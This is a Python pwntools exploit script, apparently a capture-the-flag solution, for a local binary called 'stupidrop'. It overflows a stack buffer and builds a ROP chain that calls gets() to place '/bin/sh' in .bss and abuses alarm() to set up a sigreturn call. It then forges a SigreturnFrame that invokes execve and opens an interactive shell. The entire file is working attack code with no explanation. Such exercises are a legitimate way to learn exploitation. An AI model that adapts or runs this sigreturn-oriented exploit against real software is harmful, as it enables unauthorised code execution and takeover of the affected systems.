'''
Author: Samrito
Date: 2022-03-19 17:09:53
LastEditors: Samrito
LastEditTime: 2022-03-19 17:25:30
'''
from signal import alarm
from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'

io = process(argv=['./stupidrop'])
elf = ELF('./stupidrop')
get_addr = elf.symbols['gets']
alarm_addr = elf.symbols['alarm']
bss_addr = 0x601050

syscall_addr = 0x040063E
pop_rdi = 0x4006a3  #pop rdi; ret;

frame = SigreturnFrame()
frame.rip = syscall_addr
frame.rdi = bss_addr
frame.rsi = 0x0
frame.rdx = 0x0
frame.rax = 0x3b

payload = flat([
    b'@' * (0x30 + 8), pop_rdi, bss_addr, get_addr, pop_rdi, 0xf, alarm_addr,
    pop_rdi, 0x0, alarm_addr, syscall_addr,
    bytes(frame)
])
io.sendline(payload)

io.sendline(b'/bin/sh\x00')

io.interactive()